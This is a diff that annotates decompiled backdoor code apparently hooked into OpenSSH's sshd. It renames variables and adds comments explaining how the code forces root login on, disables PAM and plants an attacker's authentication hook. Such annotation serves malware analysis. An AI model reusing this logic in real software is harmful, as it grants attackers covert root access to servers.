@@ -18,48 +18,53 @@ BOOL sshd_patch_variables
                int monitor_reqtype,global_context_t *global_ctx)
 
 {
-  int permit_root_value;
+  int current_permit_root;
   sshd_ctx_t *sshd_ctx;
   sshd_monitor_func_t authpassword_hook;
-  int *permit_root_login;
-  uint *use_pam;
+  int *permit_root_login_ptr;
+  uint *use_pam_ptr;
   
+  // AutoDoc: Refuse to run until the global ctx, sshd_ctx, and mm_answer_authpassword hook are all populated.
   if ((((global_ctx == (global_context_t *)0x0) ||
        (sshd_ctx = global_ctx->sshd_ctx, sshd_ctx == (sshd_ctx_t *)0x0)) ||
       (authpassword_hook = sshd_ctx->mm_answer_authpassword_hook, authpassword_hook == (sshd_monitor_func_t)0x0)) ||
      (sshd_ctx->have_mm_answer_authpassword == FALSE)) {
     return FALSE;
   }
+  // AutoDoc: Clamp PermitRootLogin to 3 ("yes") whenever the caller didn't explicitly skip the root tweak.
   if (skip_root_patch == FALSE) {
-    permit_root_login = sshd_ctx->permit_root_login_ptr;
-    if (permit_root_login == (int *)0x0) {
+    permit_root_login_ptr = sshd_ctx->permit_root_login_ptr;
+    if (permit_root_login_ptr == (int *)0x0) {
       return FALSE;
     }
-    permit_root_value = *permit_root_login;
-    if (permit_root_value < 3) {
-      if (permit_root_value < 0) {
+    current_permit_root = *permit_root_login_ptr;
+    if (current_permit_root < 3) {
+      if (current_permit_root < 0) {
         return FALSE;
       }
-      *permit_root_login = 3;
+      *permit_root_login_ptr = 3;
     }
-    else if (permit_root_value != 3) {
+    else if (current_permit_root != 3) {
       return FALSE;
     }
   }
+  // AutoDoc: Zero `use_pam` only when sshd exposed a writable pointer and the payload asked for the PAM bypass.
   if (disable_pam != FALSE) {
-    use_pam = (uint *)sshd_ctx->use_pam_ptr;
-    if (use_pam == (uint *)0x0) {
+    use_pam_ptr = (uint *)sshd_ctx->use_pam_ptr;
+    if (use_pam_ptr == (uint *)0x0) {
       return FALSE;
     }
-    if (1 < *use_pam) {
+    if (1 < *use_pam_ptr) {
       return FALSE;
     }
-    *use_pam = 0;
+    *use_pam_ptr = 0;
   }
+  // AutoDoc: Derive the request ID from sshd's live dispatch table so forged replies stay in sync with the monitor state machine.
   if (replace_monitor_reqtype == FALSE) {
     monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_slot + -1) + 1;
   }
   sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
+  // AutoDoc: Finally drop the attacker's hook into the genuine slot once every optional tweak is satisfied.
   *sshd_ctx->mm_answer_authpassword_slot = authpassword_hook;
   return TRUE;
 }
